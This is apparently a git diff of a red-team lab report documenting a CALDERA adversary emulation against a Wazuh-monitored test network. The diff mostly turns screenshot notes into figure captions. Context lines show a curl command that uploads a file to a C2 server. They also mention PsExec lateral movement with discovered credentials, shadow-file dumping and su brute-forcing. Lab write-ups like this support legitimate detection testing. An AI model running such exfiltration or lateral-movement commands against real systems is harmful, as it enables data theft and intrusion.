@@ -7,14 +7,9 @@ This document outlines the strategic planning, configuration, and execution of t
 2. [Target Scope](#2-target-scope)
 3. [Attack Scenarios](#3-attack-scenarios-mitre-attck-mapping)
 4. [CALDERA Configuration](#4-caldera-configuration)
-    * [4.1. Fact Source Configuration](#41-fact-source-configuration-sis_meta)
-    * [4.2. Custom Abilities Developed](#42-custom-abilities-developed)
-    * [4.3. Adversary Profile](#43-adversary-profile-project_story_mode)
 5. [Ingress Tool Transfer (Pre-Attack)](#5-ingress-tool-transfer-pre-attack)
 6. [Operation Execution Log](#6-operation-execution-log)
-   * [6.1. Detection Stress Test (Noise Generation)](#61-detection-stress-test-noise-generation-for-wazuh)
 7. [Findings & Observations](#7-findings--observations)
-    * [7.1. Technical Challenges Encountered](#71-technical-challenges-encountered)
 
 ---
 
@@ -81,9 +76,8 @@ The operation relies on a custom Fact Source to define target parameters dynamic
     *   `domain.user.name`: `employee` (Initial compromised user context)
     *   `domain.user.password`: `employee`
 
-> **Screenshot Reference:** Configuration of the Fact Source used to target the Windows machine.
->
-> ![SIS Meta Config](./images/phase1/phase1_sis_meta_config.png)
+![SIS Meta Config](./images/phase1/phase1_sis_meta_config.png)
+*Figure 1: Configuration of the Fact Source used to target the Windows machine*
 
 ### 4.2. Custom Abilities Developed
 Standard CALDERA abilities were modified to fit the specific lab environment constraints (e.g., using `python3` scripts on Linux or `curl` on Windows).
@@ -98,9 +92,8 @@ Standard CALDERA abilities were modified to fit the specific lab environment con
     ```
 *   **Purpose:** Execute the agent on the target Windows machine using the discovered Admin credentials.
 
-> **Screenshot Reference:** Configuration of the Python3 PsExec command in Caldera.
->
-> ![Lateral Movement Ability](./images/phase1/phase1_ability_lateral_config.png)
+![Lateral Movement Ability](./images/phase1/phase1_ability_lateral_config.png)
+*Figure 2: Configuration of the Python3 PsExec command in Caldera*
 
 **B. Data Exfiltration**
 *   **Name:** `Custom Exfiltration (Generate & Steal)`
@@ -111,9 +104,8 @@ Standard CALDERA abilities were modified to fit the specific lab environment con
     echo "HACKED BY RED TEAM" > C:\Users\Public\Exfil_Proof.txt && curl -F "data=@C:\Users\Public\Exfil_Proof.txt" http://10.10.0.53:8888/file/upload
     ```
 
-> **Screenshot Reference:** Configuration of the native Curl command for exfiltration.
->
-> ![Exfiltration Ability](./images/phase1/phase1_ability_exfil_config.png)
+![Exfiltration Ability](./images/phase1/phase1_ability_exfil_config.png)
+*Figure 3: Configuration of the native Curl command for exfiltration*
 
 ### 4.3. Adversary Profile (`Project_Story_Mode`)
 All abilities were chained into a single profile to simulate a complete attack lifecycle. The baseline profile consists of 11 discrete steps designed to validate the kill chain without excessive noise.
@@ -128,9 +120,8 @@ All abilities were chained into a single profile to simulate a complete attack l
 7.  **Windows Discovery** (System/Security/Account info)
 8.  **Exfiltration** (Steal Data)
 
-> **Screenshot Reference:** The baseline adversary profile configuration (11 steps).
->
-> ![Adversary Profile Baseline](./images/phase1/phase1_adversary_profile_baseline.png)
+![Adversary Profile Baseline](./images/phase1/phase1_adversary_profile_baseline.png)
+*Figure 4: The baseline adversary profile configuration (11 steps)*
 
 ---
 
@@ -177,13 +168,11 @@ The operation was executed automatically using the `Project_Story_Mode` profile.
 
 **Note on Persistence:** While the automated Cron Job ability was skipped during this specific run due to a C2 planner timing issue, the vulnerability (weak file permissions and cron access) remains valid. Persistence was successfully demonstrated via "Noisy Service Creation" in Phase 2. For example, an attacker could manually add a cron job using `crontab -e` to execute a script every minute, maintaining access even after reboots.
 
-> **Evidence:**
->
-> **1. Operation Timeline:** Green indicators confirm successful execution of the kill chain steps (11 abilities).
-> ![Operation Results](./images/phase1/phase1_operation_results_timeline.png)
->
-> **2. Active Agents:** Proof of successful Lateral Movement (Windows Agent `itlfxp` is active).
-> ![Active Agents](./images/phase1/phase1_active_agents_list.png)
+![Operation Results](./images/phase1/phase1_operation_results_timeline.png)
+*Figure 5: Green indicators confirm successful execution of the kill chain steps*
+
+![Active Agents](./images/phase1/phase1_active_agents_list.png)
+*Figure 6: Proof of successful Lateral Movement (Windows Agent `itlfxp` is active)*
 
 ### 6.1. Detection Stress Test (Noise Generation for Wazuh)
 
@@ -197,16 +186,14 @@ After validating the successful "Silent" kill chain (11 steps), the operation lo
 **Execution approach:**
 These abilities were executed manually or appended to a secondary profile run to ensure the Analyst had sufficient data points for correlation.
 
-> **Screenshot Reference:**
->
-> **1. Extended Adversary Profile:** The profile updated with noise-generating abilities (Total: 13 steps, showing "Dump Shadow" and "Noisy Service").
-> ![Extended Profile 13 Steps](./images/phase1/phase1_profile_extended_noise.png)
->
-> **2. Noise Configuration:** Setup of the malicious service creation ability.
-> ![Wazuh Noise Config](./images/phase1/phase1_ability_wazuh_noise_config.png)
->
-> **3. Manual Noise Execution:** Generating PAM authentication failures (`su` flooding) on Linux.
-> ![Manual Brute Force](./images/phase1/phase1_manual_pam_bruteforce.png)
+![Extended Profile 13 Steps](./images/phase1/phase1_profile_extended_noise.png)
+*Figure 7: The profile updated with noise-generating abilities*
+
+![Wazuh Noise Config](./images/phase1/phase1_ability_wazuh_noise_config.png)
+*Figure 8: Setup of the malicious service creation ability*
+
+![Manual Brute Force](./images/phase1/phase1_manual_pam_bruteforce.png)
+*Figure 9: Generating PAM authentication failures (su flooding) on Linux*
 
 ---
 
